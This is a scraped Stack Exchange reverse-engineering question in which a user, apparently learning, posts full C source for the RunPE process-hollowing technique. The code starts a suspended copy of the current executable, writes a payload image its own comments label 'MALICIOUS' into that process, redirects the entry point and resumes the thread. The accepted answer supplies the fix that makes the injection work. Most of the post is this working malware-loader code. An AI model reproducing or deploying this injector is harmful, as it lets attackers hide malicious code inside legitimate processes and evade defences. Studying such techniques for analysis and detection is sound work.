{
    "title": "Why I get 0xc00000005?",
    "link": "https://reverseengineering.stackexchange.com/questions/26078/why-i-get-0xc00000005",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I'm trying to use RunPE technique (For learning).</p>\n<p>First, I tried it on Windows XP(32-bit) and no error occurs but, the injected code for(HelloWorld) didn't run.</p>\n<p>Then, I tried to use it on Windows 7 and 10 (64-bit) and get this error[0xc00000005] when the thread resumed.\nWhy I get this error and why the injected code didn't run on the XP machine?</p>\n<p>I tried also to unmap the imagebase(0x00400000) but I had the same problem.</p>\n<p>my code:</p>\n<pre><code>int runPe(void* image) {\n\nIMAGE_DOS_HEADER* dosHeader;\nIMAGE_NT_HEADERS* ntHeader;\nIMAGE_SECTION_HEADER* sectionHeader;\nCONTEXT* ctx;\n\nPROCESS_INFORMATION pinfo;\nSTARTUPINFO sinfo;\n\n\nint i;\nDWORD* ImageBase = NULL;\nvoid* pImage = NULL;\nchar currentpath[1024];\n\nGetModuleFileNameA(0, currentpath, 1024);       //path to the current exe\n\n//Identifying the MALICIOUS IMAGE HEADERS\ndosHeader = (PIMAGE_DOS_HEADER)(image);\nntHeader = (PIMAGE_NT_HEADERS)((DWORD)image + dosHeader-&gt;e_lfanew);\n\n//Checks if this is a PE FILE\nif (ntHeader-&gt;Signature == IMAGE_NT_SIGNATURE) {\n\n    ZeroMemory(&amp;pinfo, sizeof(pinfo));\n    ZeroMemory(&amp;sinfo, sizeof(sinfo));\n\n    if (CreateProcessA(currentpath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;sinfo, &amp;pinfo)) {\n        printf(\"[*] Suspended process is created\\n\");\n        Sleep(600);\n\n        //Allocate memory for the context of suspended process\n        ctx = (LPCONTEXT)(VirtualAlloc(NULL, sizeof(ctx), MEM_COMMIT, PAGE_READWRITE));\n        if (ctx) {\n            ctx-&gt;ContextFlags = CONTEXT_FULL;\n            printf(\"[*] Context is allocated successfully\\n\");\n            Sleep(600);\n            \n            //Get the thread context\n            if (GetThreadContext(pinfo.hThread, (LPCONTEXT)ctx)) {\n                printf(\"[*] Allocating MALICIOUS image headers into the suspended process\\n\");\n                Sleep(600);\n\n                ReadProcessMemory(pinfo.hProcess,(LPCVOID)(ctx-&gt;Ebx + 8), (LPVOID)(&amp;ImageBase), 4, 0);\n\n                pImage = VirtualAllocEx(pinfo.hProcess, NULL,\n                    ntHeader-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\n                if (pImage) {\n                    printf(\"[*] Allocating memory for MALICIOUS image headers into the IMAGE_BASE\\n\");\n                    Sleep(600);\n\n                    //Writing the image intor the process address space\n                    if (WriteProcessMemory(pinfo.hProcess, (LPVOID)pImage, image, ntHeader-&gt;OptionalHeader.SizeOfHeaders, NULL)) {\n                        printf(\"[*] Writing memory for MALICIOUS image headers into the IMAGE_BASE\\n\");\n                        Sleep(600);\n\n                        //sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)image + dosHeader-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS));\n                        for (i = 0; i &lt; ntHeader-&gt;FileHeader.NumberOfSections; i++)\n                        {\n\n                            sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)image + dosHeader-&gt;e_lfanew + 248 + (i * sizeof(IMAGE_SECTION_HEADER)));\n                            if (sectionHeader-&gt;SizeOfRawData == 00000000)\n                                continue;\n\n                            if (WriteProcessMemory(pinfo.hProcess, (LPVOID)((DWORD)(pImage) + sectionHeader-&gt;VirtualAddress),\n                                (LPVOID)((DWORD)image + sectionHeader-&gt;PointerToRawData), sectionHeader-&gt;SizeOfRawData, 0))\n                            {\n                                printf(\"[*] Allocating memory for Section %d at %X\\n\", i, (LPVOID)((DWORD)pImage + sectionHeader-&gt;VirtualAddress));\n                                Sleep(600);\n                            }\n                            else\n                            {\n                                printf(\"ERROR: Writing section (%d) into memory failed\\n\", i);\n                                printf(\"Error Code: %d\\n\", GetLastError());\n                                return -1;\n                            }\n                        }\n\n                        //Change the imageBase address from the suspened process into the MALICIOUS\n                        if (WriteProcessMemory(pinfo.hProcess, (LPVOID)(ctx-&gt;Ebx + 8), (LPVOID)(ntHeader-&gt;OptionalHeader.ImageBase), 4, 0)) {\n                            printf(\"[*] Image base address is changed to MALICIOUS\\n\");\n                            Sleep(600);\n\n                            //Now we will move the address of entrypoint to the MALCIOUS image\n                            // At EAX register\n                            ctx-&gt;Eax = (DWORD)pImage + ntHeader-&gt;OptionalHeader.AddressOfEntryPoint;\n                            printf(\"[*] AddressOfEntryPoint is changed to MALICIOUS\\n\");\n                            Sleep(600);\n                            \n                            //Set Thread Context and resume it\n                            SetThreadContext(pinfo.hProcess, (LPCONTEXT)ctx);\n                            ResumeThread(pinfo.hThread);\n                            printf(\"[*] Thread is resumed\\n\");\n                        }\n\n                        else\n                        {\n                            printf(\"ERROR: Change the imageBase address from the suspened process into the MALICIOUS failed\\n\");\n                            printf(\"Error Code: %d\\n\", GetLastError());\n                            return -1;\n                        }\n                    }\n                    else\n                    {\n                        printf(\"ERROR: Writing the image into the process address space failed\\n\");\n                        printf(\"Error Code: %d\\n\", GetLastError());\n                        return -1;\n                    }\n        \n                }\n                else\n                {\n                    printf(\"ERROR: Allocating memory for MALICIOUS image headers into the IMAGE_BASE failed\\n\");\n                    printf(\"Error Code: %d\\n\", GetLastError());\n                    return -1;\n                }\n            }\n            else\n            {\n                printf(\"ERROR: GetThreadContext failed\\n\");\n                printf(\"Error Code: %d\\n\", GetLastError());\n                return -1;\n            }\n        }\n        else\n        {\n            printf(\"ERROR: Context allocation failed\\n\");\n            printf(\"Error Code: %d\\n\", GetLastError());\n            return -1;\n        }\n    }\n\n    return 0;\n}\n\nelse\n{\n    printf(\"ERROR: Invalid nt SIGNATURE\\n\");\n    printf(\"Error Code: %d\\n\", GetLastError());\n    return -1;\n}\n</code></pre>\n<p>}</p>\n</div>",
    "votes": "-1",
    "answers": 1,
    "views": "117",
    "tags": [
        "c",
        "pe"
    ],
    "user": "Raafat",
    "time": "Oct 7, 2020 at 6:55",
    "comments": [],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>SOLVED:</p>\n<p>I must pass the address of the buffer not the value inside that buffer in WriteProcessMemmory\n[Call by reference]</p>\n<p>Modified:</p>\n<pre><code>WriteProcessMemory(pinfo.hProcess, (LPVOID)(ctx-&gt;Ebx + 8), (LPVOID)(&amp;ntHeader-&gt;OptionalHeader.ImageBase), 4, 0)\n</code></pre>\n</div>",
            "votes": "2",
            "user": "Raafat",
            "time": "Oct 7, 2020 at 20:18",
            "is_accepted": true,
            "comments": []
        }
    ]
}